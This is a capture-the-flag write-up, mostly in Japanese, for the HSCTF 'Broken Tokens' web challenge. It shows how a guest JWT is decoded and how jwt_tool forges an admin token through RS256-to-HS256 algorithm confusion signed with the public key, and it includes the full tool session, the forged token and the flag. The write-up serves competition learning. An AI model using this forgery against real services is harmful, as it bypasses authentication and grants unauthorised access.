# Broken Tokens:Web Exploitation:100pts
I made a login page, is it really secure?  
[https://broken-tokens.web.hsctf.com/](https://broken-tokens.web.hsctf.com)  
Note: If you receive an "Internal Server Error" (HTTP Status Code 500), that means that your cookie is incorrect.  

# Solution
アクセスするとログインフォームとpublickey.pemがある。  
Web Portal Login  
[site.png](site/site.png)  
何も入力せずログインするとguestとなる。  
ところでcookieに以下のような値が入っていた。  
```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
```
JWTだ。  
[JSON Web Tokens - jwt.io](https://jwt.io)で中身を見ると以下のようであった。  
HEADER:ALGORITHM & TOKEN TYPE  
```json
{
  "typ": "JWT",
  "alg": "RS256"
}
```
PAYLOAD:DATA   
```json
{
  "auth": "guest"
}
```
adminとすればいいようだ。  
[The JSON Web Token Toolkit](https://github.com/ticarpi/jwt_tool)を使う。  
Tamper with JWT data (multiple signing options)でよい。  
一部の出力は省略する。  
```bash
$ ls
LICENSE  README.md  jwt_tool.py  publickey.pem
$ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
> 1
> 0
> 1
> admin
> 0
> 5
> publickey.pem
> 1

Your new forged token:
[+] URL safe: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4
[+] Standard: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM+1Sz+SzKvad4
```
改竄できた以下のJWTをセットするとflagが得られる。  
```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM+1Sz+SzKvad4
```
flag  
[flag.png](site/flag.png)  

## flag{1n53cur3_tok3n5_5474212}